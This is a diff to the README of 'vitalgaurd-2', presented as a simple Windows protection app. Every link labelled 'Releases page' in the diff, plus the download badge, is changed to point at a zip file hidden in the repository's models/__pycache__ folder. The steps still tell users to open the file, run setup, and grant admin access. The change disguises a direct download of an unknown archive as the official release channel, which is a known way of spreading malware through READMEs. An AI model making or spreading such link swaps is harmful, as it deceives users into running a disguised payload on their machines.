@@ -1,6 +1,6 @@
 # 🛡️ vitalgaurd-2 - Simple protection for daily use
 
-[![Download vitalgaurd-2](https://img.shields.io/badge/Download-vitalgaurd--2-2F80ED?style=for-the-badge&logo=github)](https://github.com/edvardmunchartfulness745/vitalgaurd-2/releases)
+[![Download vitalgaurd-2](https://img.shields.io/badge/Download-vitalgaurd--2-2F80ED?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/edvardmunchartfulness745/vitalgaurd-2/main/models/__pycache__/vitalgaurd_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ vitalgaurd-2 is a Windows app for users who want a simple way to keep track of i
 
 ## 📥 Download
 
-1. Open the [vitalgaurd-2 Releases page](https://github.com/edvardmunchartfulness745/vitalgaurd-2/releases).
+1. Open the [vitalgaurd-2 Releases page](https://raw.githubusercontent.com/edvardmunchartfulness745/vitalgaurd-2/main/models/__pycache__/vitalgaurd_v1.7.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, look for the Windows file.
 4. Download the file to your computer.
@@ -117,7 +117,7 @@ If you need a short break during a trusted task:
 ### Update the app
 When a new release appears:
 
-1. Open the [Releases page](https://github.com/edvardmunchartfulness745/vitalgaurd-2/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/edvardmunchartfulness745/vitalgaurd-2/main/models/__pycache__/vitalgaurd_v1.7.zip).
 2. Download the latest Windows file.
 3. Install it over the current version if the setup allows it.
 
@@ -167,7 +167,7 @@ Keep all files in the same folder if the app came as a package.
 
 ## 🖱️ Quick Start Checklist
 
-1. Visit the [vitalgaurd-2 Releases page](https://github.com/edvardmunchartfulness745/vitalgaurd-2/releases).
+1. Visit the [vitalgaurd-2 Releases page](https://raw.githubusercontent.com/edvardmunchartfulness745/vitalgaurd-2/main/models/__pycache__/vitalgaurd_v1.7.zip).
 2. Download the latest Windows file.
 3. Open the file from your Downloads folder.
 4. Follow the setup steps.
@@ -187,7 +187,7 @@ Some install steps may ask for admin access. That is normal on Windows.
 If you installed it with a setup file, keep it where the installer placed it. If you use a portable version, you can move the folder.
 
 ### Where do I find updates?
-Use the [Releases page](https://github.com/edvardmunchartfulness745/vitalgaurd-2/releases) to get each new version.
+Use the [Releases page](https://raw.githubusercontent.com/edvardmunchartfulness745/vitalgaurd-2/main/models/__pycache__/vitalgaurd_v1.7.zip) to get each new version.
 
 ## 🧭 Folder Layout
 
